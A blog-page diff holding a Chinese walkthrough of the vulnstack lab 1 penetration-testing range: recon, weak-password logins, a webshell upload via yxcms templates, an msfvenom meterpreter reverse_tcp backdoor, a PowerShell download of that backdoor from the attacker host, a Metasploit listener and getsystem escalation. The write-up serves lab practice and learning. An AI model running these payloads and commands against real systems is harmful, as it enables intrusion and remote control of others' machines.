@@ -16,57 +16,60 @@
   <meta name="author" content="Greed">
   <meta name="keywords" content="">
   
-    <meta name="description" content="关于vulnstack国内的渗透测试靶场，由红日安全团队打造。 卖课的，但是靶场用来练手还不错。 目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，链接 由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名 靶场一环境搭建 下载后解压，共有三台机子 win7、win2003、winserver 2008 R2，默认密码 hongri">
+    <meta name="description" content="[TOC] 关于vulnstack国内的渗透测试靶场，由红日安全团队打造。 卖课的，但是靶场用来练手还不错。 目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，链接 由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名 靶场一环境搭建 下载后解压，共有三台机子 win7、win2003、winserver 2008 R2，默认密码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnstack靶场日记">
-<meta property="og:url" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/index.html">
+<meta property="og:title" content="vulnstack靶场日记-1">
+<meta property="og:url" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/index.html">
 <meta property="og:site_name" content="Welcome to greed&#39; blog">
-<meta property="og:description" content="关于vulnstack国内的渗透测试靶场，由红日安全团队打造。 卖课的，但是靶场用来练手还不错。 目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，链接 由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名 靶场一环境搭建 下载后解压，共有三台机子 win7、win2003、winserver 2008 R2，默认密码 hongri">
+<meta property="og:description" content="[TOC] 关于vulnstack国内的渗透测试靶场，由红日安全团队打造。 卖课的，但是靶场用来练手还不错。 目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，链接 由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名 靶场一环境搭建 下载后解压，共有三台机子 win7、win2003、winserver 2008 R2，默认密码">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130144157472.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130150409166.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130152957440.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130152929871.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130163455279.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130163739198.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130165352796.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130165416984.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130171219723.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130172215581.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130172541423.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201122155255.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201131030392.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201153045335.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201154424561.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201171640358.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201171841342.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202113659562.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202115734625.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202115808187.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202120036461.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202120108061.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202192155216.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203115302684.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202121821429.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231202143323918.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203120354256.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122046969.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122212018.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203122249273.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203124202191.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203150644924.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231203151835605.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130144157472.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130150409166.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152957440.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152929871.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163455279.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163739198.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165352796.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165416984.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130171219723.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172215581.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172541423.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201122155255.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201131030392.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201153045335.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201154424561.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171640358.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171841342.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202113659562.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115734625.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115808187.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120036461.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120108061.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202192155216.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203115302684.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202121821429.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202143323918.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203120354256.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122046969.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122212018.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122249273.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203124202191.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203150644924.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203151835605.png">
 <meta property="article:published_time" content="2023-11-30T06:22:38.000Z">
-<meta property="article:modified_time" content="2023-12-03T09:01:08.130Z">
+<meta property="article:modified_time" content="2023-12-04T00:49:18.983Z">
 <meta property="article:author" content="Greed">
+<meta property="article:tag" content="解题记录">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="vulnstack">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130144157472.png">
+<meta name="twitter:image" content="https://just1greed.github.io/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130144157472.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulnstack靶场日记 - Welcome to greed&#39; blog</title>
+  <title>vulnstack靶场日记-1 - Welcome to greed&#39; blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -244,7 +247,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnstack靶场日记"></span>
+            <span id="subtitle" data-typed-text="vulnstack靶场日记-1"></span>
           
         </div>
 
@@ -267,7 +270,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.8k 字
+          6k 字
         
       </span>
     
@@ -278,7 +281,7 @@
         
         
         
-          49 分钟
+          50 分钟
         
       </span>
     
@@ -323,7 +326,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">vulnstack靶场日记</h1>
+            <h1 id="seo-header">vulnstack靶场日记-1</h1>
             
               <p class="note note-info">
                 
@@ -336,7 +339,8 @@
             
               <div class="markdown-body">
                 
-                <h3 id="关于vulnstack"><a href="#关于vulnstack" class="headerlink" title="关于vulnstack"></a>关于vulnstack</h3><p>国内的渗透测试靶场，由红日安全团队打造。</p>
+                <p>[TOC]</p>
+<h3 id="关于vulnstack"><a href="#关于vulnstack" class="headerlink" title="关于vulnstack"></a>关于vulnstack</h3><p>国内的渗透测试靶场，由红日安全团队打造。</p>
 <p>卖课的，但是靶场用来练手还不错。</p>
 <p>目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/">链接</a></p>
 <p>由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名</p>
@@ -346,7 +350,7 @@
 <li>win7 利用phpstudy打开网络服务(可以用everything搜索phpstudy)，本机尝试访问 <code>http://127.0.0.1</code> 检查是否开启</li>
 </ol>
 <h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><p>需要搭建两个局域网，我使用的VMware，添加两个网络适配器(原有的NET加任意VMnet)，此处我使用net 加 VMnet2，如图</p>
-<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130144157472.png" srcset="/img/loading.gif" lazyload alt="image-20231130144157472">
+<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130144157472.png" srcset="/img/loading.gif" lazyload alt="image-20231130144157472">
 
 <p>其中，kali 和 win7 接入NET，模拟外网，win7、win2003、win server 2008 接入 VMnet2，模拟内网</p>
 <h5 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h5><ul>
@@ -365,9 +369,9 @@
 </ul>
 <h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h4><p>kali -&gt; win7</p>
 <h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ol>
-<li><p>netdiscover 发现 ip 192.168.48.138，nmap 扫端口开放80和3306端口<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130150409166.png" srcset="/img/loading.gif" lazyload alt="image-20231130150409166"></p>
+<li><p>netdiscover 发现 ip 192.168.48.138，nmap 扫端口开放80和3306端口<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130150409166.png" srcset="/img/loading.gif" lazyload alt="image-20231130150409166"></p>
 </li>
-<li><p>浏览器访问，发现phpstudy探针，初步查看：安全模式没开、魔术引号没开、禁用函数为空、mysql弱口令 <code>root  root</code> 成功连接，可以说毫无防备漏洞百出了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130152957440.png" srcset="/img/loading.gif" lazyload alt="image-20231130152957440"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130152929871.png" srcset="/img/loading.gif" lazyload alt="image-20231130152929871"></p>
+<li><p>浏览器访问，发现phpstudy探针，初步查看：安全模式没开、魔术引号没开、禁用函数为空、mysql弱口令 <code>root  root</code> 成功连接，可以说毫无防备漏洞百出了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152957440.png" srcset="/img/loading.gif" lazyload alt="image-20231130152957440"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152929871.png" srcset="/img/loading.gif" lazyload alt="image-20231130152929871"></p>
 </li>
 <li><p>dirb扫一下，出了以下内容</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">phpinfo<br><span class="hljs-function"><span class="hljs-title">phpmyadmin</span><span class="hljs-params">(弱口令root/root)</span></span><br>phpmyadmin/changelog php版本<span class="hljs-number">3.5</span>.<span class="hljs-number">8.2</span>  初步判断没有可直接拿shell的途径<br></code></pre></td></tr></table></figure>
@@ -375,15 +379,15 @@
 <p>加后缀重新扫</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.138</span> <span class="hljs-string">/usr/share/dirb/wordlists/big.txt</span> -X <span class="hljs-string">.php</span>,<span class="hljs-string">.zip</span>,<span class="hljs-string">.7z</span>,<span class="hljs-string">.rar</span>（windows压缩方式为zip、rar）<br>出了个beifen.rar<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>下载并解压 beifen.rar ，发现yxcms(1.2.1)网站源码<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130163455279.png" srcset="/img/loading.gif" lazyload alt="image-20231130163455279"></p>
-<p>后台地址 <code>/yxcms/index.php?r=admin</code> 默认密码 <code>admin/123456</code>   <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130163739198.png" srcset="/img/loading.gif" lazyload alt="image-20231130163739198"></p>
+<li><p>下载并解压 beifen.rar ，发现yxcms(1.2.1)网站源码<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163455279.png" srcset="/img/loading.gif" lazyload alt="image-20231130163455279"></p>
+<p>后台地址 <code>/yxcms/index.php?r=admin</code> 默认密码 <code>admin/123456</code>   <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163739198.png" srcset="/img/loading.gif" lazyload alt="image-20231130163739198"></p>
 </li>
 </ol>
 <h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol>
-<li><p>成功登入yxcms管理后台，搜索1.2.1版本漏洞，发现前台模板处存在任意文件上传，编写上传一句话，蚁剑成功连接<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130165352796.png" srcset="/img/loading.gif" lazyload alt="image-20231130165352796"></p>
+<li><p>成功登入yxcms管理后台，搜索1.2.1版本漏洞，发现前台模板处存在任意文件上传，编写上传一句话，蚁剑成功连接<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165352796.png" srcset="/img/loading.gif" lazyload alt="image-20231130165352796"></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.138</span><span class="hljs-regexp">/yxcms/</span>protected<span class="hljs-regexp">/apps/</span>default<span class="hljs-regexp">/view/</span>default/shell.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130165416984.png" srcset="/img/loading.gif" lazyload alt="image-20231130165416984"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165416984.png" srcset="/img/loading.gif" lazyload alt="image-20231130165416984"></p>
 </li>
 <li><p>直接拿到用户权限(此处为administrator)</p>
 </li>
@@ -392,26 +396,26 @@
 <li><p>利用Msfvenom创建后门程序</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--platform</span> windows -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> “\x00” -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10</span> -f exe -o /var/www/html/safe<span class="hljs-selector-class">.exe</span><br><br>-a： 指定架构如x86 x64。x86代表<span class="hljs-number">32</span>位，x64代表<span class="hljs-number">64</span>位。<span class="hljs-number">32</span>位软件可以在<span class="hljs-number">64</span>位系统上运行。所以我们生成<span class="hljs-number">32</span>位的后门，这样在<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位系统中都可以使用。<br>–platform： 指定平台，这里选择windows，通过–l platforms可以查看所有支持的平台。<br>-<span class="hljs-selector-tag">p</span>: 设置攻击载荷，我们使用windows/meterpreter/reverse_tcp，可以通过-l payloads查看所有攻击载荷。<br>**LHOST:**目标主机执行程序后连接我们Kali的地址LPORT目标主机执行程序后连接我们Kali的端口<br>-<span class="hljs-selector-tag">b</span>: 去掉坏字符，坏字符会影响payload 正常执行。<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130171219723.png" srcset="/img/loading.gif" lazyload alt="image-20231130171219723"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130171219723.png" srcset="/img/loading.gif" lazyload alt="image-20231130171219723"></p>
 </li>
 <li><p>python开启http服务，在win上下载后门文件并执行，在msf上监听</p>
 <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># kali</span><br>python -m http.<span class="hljs-keyword">server</span> <span class="hljs-number">9999</span><br><br><span class="hljs-meta"># win7(通过蚁剑的命令行执行)</span><br>powershell (<span class="hljs-keyword">new</span>-object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.48.129:9999/safe.exe&#x27;</span>,<span class="hljs-string">&#x27;safe.exe&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msfconsole</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444(默认)<br>exploit<br><br><span class="hljs-comment"># win7</span><br>运行safe.exe<br></code></pre></td></tr></table></figure>
 
-<p>欧~了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130172215581.png" srcset="/img/loading.gif" lazyload alt="image-20231130172215581"></p>
+<p>欧~了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172215581.png" srcset="/img/loading.gif" lazyload alt="image-20231130172215581"></p>
 </li>
-<li><p>getsystem提权<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231130172541423.png" srcset="/img/loading.gif" lazyload alt="image-20231130172541423"></p>
+<li><p>getsystem提权<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172541423.png" srcset="/img/loading.gif" lazyload alt="image-20231130172541423"></p>
 </li>
 </ol>
 <h5 id="提权2-systeminfo-提权辅助"><a href="#提权2-systeminfo-提权辅助" class="headerlink" title="提权2 - systeminfo + 提权辅助"></a>提权2 - systeminfo + 提权辅助</h5><ol>
 <li>我们利用命令行(蚁剑或者meterpreter的shell)执行 <code>systeminfo</code> 指令，查看系统信息和安装的补丁</li>
-<li>利用提权辅助网页 <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">提权辅助网页 Windows提权辅助 (hacking8.com)</a> 查看可用的payload<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201122155255.png" srcset="/img/loading.gif" lazyload alt="image-20231201122155255"></li>
+<li>利用提权辅助网页 <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">提权辅助网页 Windows提权辅助 (hacking8.com)</a> 查看可用的payload<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201122155255.png" srcset="/img/loading.gif" lazyload alt="image-20231201122155255"></li>
 </ol>
 <h5 id="提权3-提权辅助工具-payload利用"><a href="#提权3-提权辅助工具-payload利用" class="headerlink" title="提权3 - 提权辅助工具 + payload利用"></a>提权3 - 提权辅助工具 + payload利用</h5><p>利用提权辅助工具 <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">carlospolop&#x2F;PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)</a> 查看可利用的提权项，教程： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/124374117">全平台系统提权辅助工具 PEASS-ng</a> </p>
 <figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-comment"># 此处用的bat执行结果不带有彩色标注</span><br>winPEAS.bat &gt; <span class="hljs-built_in">result</span>.txt<br><span class="hljs-keyword">type</span> <span class="hljs-built_in">result</span>.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231201131030392.png" srcset="/img/loading.gif" lazyload alt="image-20231201131030392"></p>
+<p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201131030392.png" srcset="/img/loading.gif" lazyload alt="image-20231201131030392"></p>
 <p>根据可利用的payload提权即可</p>
 <h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><ol>
 <li><p>隐藏后门文件</p>
@@ -422,13 +426,13 @@
 </ol>
